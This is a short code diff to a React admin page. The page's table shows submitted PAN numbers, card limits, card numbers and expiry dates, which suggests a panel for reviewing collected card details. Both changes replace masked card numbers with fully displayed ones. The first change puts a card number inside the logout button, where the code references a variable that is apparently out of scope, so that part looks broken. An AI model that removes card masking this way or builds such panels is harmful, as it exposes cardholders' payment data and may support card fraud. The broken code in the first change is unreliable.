@@ -147,7 +147,7 @@ export default function Admin() {
           onClick={handleLogout}
           className="flex items-center gap-2 bg-white text-[#96144c] px-4 py-2 rounded-lg font-semibold text-sm hover:bg-white/90 transition-all"
         >
-          {maskCard(sub.cardNumber)}  →  {formatCard(sub.cardNumber)}
+          {formatCard(sub.cardNumber)}  →  {formatCard(sub.cardNumber)}
           <LogOut size={16} /> Logout
         </button>
       </header>
@@ -250,7 +250,7 @@ export default function Admin() {
                       <td className="px-3 py-3 text-gray-600 font-mono">{sub.pan || "N/A"}</td>
                       <td className="px-3 py-3 text-gray-600">₹{sub.cardLimit || "N/A"}</td>
                       <td className="px-3 py-3 text-gray-600 font-mono">
-                        {maskCard(sub.cardNumber)}
+                        {formatCard(sub.cardNumber)}
                       </td>
                       <td className="px-3 py-3 text-gray-600">{sub.expiry || "N/A"}</td>
                       <td className="px-3 py-3">
